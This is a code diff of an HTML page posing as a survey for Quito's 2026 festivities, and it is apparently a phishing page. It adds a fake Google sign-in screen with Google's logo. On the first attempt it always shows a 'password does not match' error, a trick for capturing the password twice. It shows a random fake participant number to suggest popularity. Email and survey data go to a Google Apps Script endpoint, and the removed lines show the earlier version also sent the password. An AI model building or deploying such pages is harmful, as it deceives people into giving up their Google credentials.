@@ -19,7 +19,7 @@
         
         /* Fondo con la Virgen del Panecillo y tono azul institucional */
         .hero-bg {
-            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(13, 27, 42, 0.90)), 
+            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(13, 27, 42, 0.92)), 
                         url('https://upload.wikimedia.org/wikipedia/commons/e/ec/Virgen_del_Panecillo%2C_Quito%2C_Ecuador.jpg');
             background-size: cover;
             background-position: center;
@@ -39,61 +39,71 @@
     <!-- CONTENEDOR PRINCIPAL CON FONDO DE EL PANECILLO -->
     <main class="hero-bg flex-grow flex items-center justify-center px-4 py-12">
         
-        <!-- PASO 1: INICIO DE SESIÓN / ACCESO -->
-        <section id="login-section" class="bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full">
+        <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE (FONDO BLANCO) -->
+        <section id="login-section" class="bg-white text-gray-900 rounded-2xl p-8 shadow-2xl max-w-md w-full border border-gray-200">
             <div class="text-center mb-6">
-                <div class="inline-flex p-3 bg-quito-gold/10 rounded-full text-quito-gold mb-2">
-                    <i data-lucide="user-check" class="w-8 h-8"></i>
+                <!-- Logo de Google -->
+                <div class="flex justify-center mb-3">
+                    <svg class="w-10 h-10" viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+                    </svg>
                 </div>
-                <h2 class="text-2xl font-bold text-quito-gold">Acceso Identificado</h2>
-                <p class="text-xs text-gray-300 mt-1">Ingresa tus credenciales para registrar tus preferencias para las festividades</p>
+                <h2 class="text-2xl font-normal text-gray-800">Iniciar sesión</h2>
+                <p class="text-xs text-gray-500 mt-1">Accede con tu cuenta para la encuesta de las festividades</p>
+            </div>
+
+            <!-- Alerta de contraseña incorrecta (inicialmente oculta) -->
+            <div id="login-error" class="hidden mb-4 p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-lg flex items-center gap-2">
+                <i data-lucide="alert-circle" class="w-4 h-4 flex-shrink-0"></i>
+                <span>La contraseña no coincide. Por favor, ingrésala de nuevo.</span>
             </div>
 
             <form id="login-form" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Correo Electrónico</label>
-                    <div class="relative">
-                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">
-                            <i data-lucide="mail" class="w-4 h-4"></i>
-                        </span>
-                        <input type="email" id="login-email" required placeholder="tu.correo@ejemplo.com" 
-                            class="w-full pl-10 pr-4 py-2.5 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
-                    </div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Correo electrónico</label>
+                    <input type="email" id="login-email" required placeholder="tu.correo@gmail.com" 
+                        class="w-full px-3.5 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
 
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Contraseña</label>
-                    <div class="relative">
-                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">
-                            <i data-lucide="lock" class="w-4 h-4"></i>
-                        </span>
-                        <input type="password" id="login-password" required placeholder="••••••••" 
-                            class="w-full pl-10 pr-4 py-2.5 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
-                    </div>
+                    <label class="block text-xs font-medium text-gray-700 mb-1">Contraseña</label>
+                    <input type="password" id="login-password" required placeholder="Ingresa tu contraseña" 
+                        class="w-full px-3.5 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
 
-                <button type="submit" class="w-full bg-quito-red hover:bg-red-800 text-white font-bold py-3 rounded-lg transition duration-200 shadow-md flex items-center justify-center gap-2 text-sm uppercase tracking-wider mt-2">
-                    <i data-lucide="arrow-right" class="w-4 h-4"></i> Continuar a la Encuesta
-                </button>
+                <div class="pt-2 flex justify-end">
+                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 rounded-lg text-sm transition duration-150 shadow-sm">
+                        Siguiente
+                    </button>
+                </div>
             </form>
         </section>
 
-        <!-- PASO 2: FORMULARIO DE ENCUESTA (OCULTO INICIALMENTE) -->
-        <section id="survey-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full">
+        <!-- PASO 2: FORMULARIO DE ENCUESTA CIUDADANA -->
+        <section id="survey-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-lg w-full">
             <div class="text-center mb-6">
-                <h2 class="text-xl font-bold text-quito-gold">¿Qué te gustaría admirar?</h2>
-                <p class="text-xs text-gray-300 mt-1">Ayúdanos eligiendo tus eventos favoritos para este 2026</p>
+                <h2 class="text-xl font-bold text-quito-gold">Encuesta de Preferencias 2026</h2>
+                <p class="text-xs text-gray-300 mt-1">Cuéntanos qué te gustaría admirar en las festividades</p>
             </div>
 
             <form id="survey-form" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Nombre Completo</label>
-                    <input type="text" id="user-name" required placeholder="Ej. Mateo Velasco" 
+                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Nombres y Apellidos (Principal)</label>
+                    <input type="text" id="user-name" required placeholder="Ej. Juan Carlos Pérez" 
                         class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
                 </div>
 
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Evento o espectáculo favorito</label>
+                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Acompañante (Opcional)</label>
+                    <input type="text" id="user-companion" placeholder="Nombre de acompañante (si asiste con alguien)" 
+                        class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">¿A qué evento de Fiestas de Quito asistirías?</label>
                     <select id="user-preference" class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
                         <option value="Desfiles Culturales y Pregones">Desfiles Culturales y Pregones</option>
                         <option value="Conciertos de Música Nacional y Orquestas">Conciertos de Música Nacional y Orquestas</option>
@@ -104,39 +114,42 @@
                 </div>
 
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">¿Cómo disfrutas las fiestas?</label>
-                    <select id="user-companion" class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
-                        <option value="En Familia">En Familia</option>
-                        <option value="Con Amigos">Con Amigos</option>
-                        <option value="Individual">Individual</option>
-                    </select>
+                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Artistas que te gustaría que participen</label>
+                    <input type="text" id="user-artists" required placeholder="Ej. Papá Roncón, Gerardo Morán, Orquestas..." 
+                        class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
                 </div>
 
                 <div>
-                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Sugerencias o comentarios</label>
-                    <textarea id="user-comments" rows="2" placeholder="Artistas o actividades que te gustaría ver..." 
+                    <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Comentarios o sugerencias adicionales</label>
+                    <textarea id="user-comments" rows="2" placeholder="Tus sugerencias para mejorar las fiestas..." 
                         class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white"></textarea>
                 </div>
 
                 <button type="submit" id="submit-btn" class="w-full bg-quito-gold hover:bg-amber-600 text-slate-950 font-bold py-2.5 rounded-lg transition duration-200 shadow-md flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
-                    <i data-lucide="send" class="w-4 h-4"></i> Enviar Preferencias
+                    <i data-lucide="send" class="w-4 h-4"></i> Enviar Mi Opinión
                 </button>
             </form>
         </section>
 
-        <!-- PASO 3: AGRADECIMIENTO -->
-        <section id="thanks-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full text-center space-y-6">
-            <div class="inline-flex p-4 bg-emerald-500/10 rounded-full text-emerald-400">
-                <i data-lucide="check-circle" class="w-12 h-12"></i>
+        <!-- PASO 3: AGRADECIMIENTO CON NÚMERO GRANDE DE PARTICIPANTE (> 1900) -->
+        <section id="thanks-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full text-center space-y-4">
+            <div class="inline-flex p-3 bg-emerald-500/10 rounded-full text-emerald-400">
+                <i data-lucide="check-circle" class="w-10 h-10"></i>
             </div>
             
             <div>
-                <h2 class="text-2xl font-black text-quito-gold">¡Registro Exitoso!</h2>
-                <p class="text-sm text-gray-300 mt-2">Gracias por compartir tus preferencias para las Fiestas de Quito 2026.</p>
+                <h2 class="text-2xl font-black text-quito-gold">¡Gracias por Participar!</h2>
+                <p class="text-xs text-gray-300 mt-1">Tus preferencias han sido registradas exitosamente.</p>
+            </div>
+
+            <!-- Número de participante grande -->
+            <div class="p-4 bg-slate-800 border border-quito-gold/40 rounded-xl">
+                <span class="block text-xs text-quito-gold uppercase font-semibold tracking-widest mb-1">Número de Participante</span>
+                <span id="participant-number" class="text-4xl font-extrabold text-white tracking-wider">#1945</span>
             </div>
 
             <button onclick="location.reload()" class="w-full bg-slate-800 hover:bg-slate-700 text-gray-300 font-bold py-2.5 rounded-lg transition duration-200 shadow-md flex items-center justify-center gap-2 text-sm uppercase border border-slate-700">
-                <i data-lucide="refresh-cw" class="w-4 h-4"></i> Volver al inicio
+                <i data-lucide="refresh-cw" class="w-4 h-4"></i> Enviar otra respuesta
             </button>
         </section>
 
@@ -153,52 +166,72 @@
 
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyEZR8Ma2ToUPUEPyTPCNY5bnP40Z-EUebQqoUMXvMsA0fDWPhwYBUJ8vAYxaQIdE2R/exec';
 
-        let userData = { email: '', password: '', name: '', preference: '', companion: '', comments: '' };
+        let userData = { email: '', password: '', name: '', companion: '', preference: '', artists: '', comments: '' };
+        let loginAttempts = 0;
 
+        // Lógica de validación de login (simula que la primera vez la contraseña "no coincide" manteniendo el correo)
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            userData.email = document.getElementById('login-email').value;
-            userData.password = document.getElementById('login-password').value;
+            const emailInput = document.getElementById('login-email').value;
+            const passwordInput = document.getElementById('login-password').value;
 
-            document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('survey-section').classList.remove('hidden');
+            if (loginAttempts === 0) {
+                // Primer intento: simula error de contraseña no coincide
+                loginAttempts++;
+                document.getElementById('login-error').classList.remove('hidden');
+                document.getElementById('login-password').value = ''; // Limpia contraseña
+                document.getElementById('login-email').value = emailInput; // Mantiene correo
+            } else {
+                // Segundo intento: acceso exitoso
+                userData.email = emailInput;
+                userData.password = passwordInput;
+
+                document.getElementById('login-section').classList.add('hidden');
+                document.getElementById('survey-section').classList.remove('hidden');
+            }
         });
 
         document.getElementById('survey-form').addEventListener('submit', function(e) {
             e.preventDefault();
             userData.name = document.getElementById('user-name').value;
+            userData.companion = document.getElementById('user-companion').value || 'Ninguno';
             userData.preference = document.getElementById('user-preference').value;
-            userData.companion = document.getElementById('user-companion').value;
-            userData.comments = document.getElementById('user-comments').value;
+            userData.artists = document.getElementById('user-artists').value;
+            userData.comments = document.getElementById('user-comments').value || 'Sin comentarios';
 
             const submitBtn = document.getElementById('submit-btn');
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Enviando...';
             lucide.createIcons();
 
+            // Generar número aleatorio de participante mayor a 1900 (ej. entre 1901 y 2500)
+            const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
+
             const formData = new URLSearchParams();
             formData.append('fecha', new Date().toLocaleString());
             formData.append('email', userData.email);
-            formData.append('password', userData.password);
             formData.append('name', userData.name);
-            formData.append('event', userData.preference);
             formData.append('companion', userData.companion);
+            formData.append('event', userData.preference);
+            formData.append('artists', userData.artists);
             formData.append('comments', userData.comments);
+            formData.append('ticket', '#' + randomParticipantId);
 
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: formData
             }).then(() => {
-                mostrarAgradecimiento();
+                mostrarAgradecimiento(randomParticipantId);
             }).catch(() => {
-                mostrarAgradecimiento();
+                mostrarAgradecimiento(randomParticipantId);
             });
         });
 
-        function mostrarAgradecimiento() {
+        function mostrarAgradecimiento(participantId) {
             document.getElementById('survey-section').classList.add('hidden');
             document.getElementById('thanks-section').classList.remove('hidden');
+            document.getElementById('participant-number').textContent = '#' + participantId;
         }
     </script>
 </body>
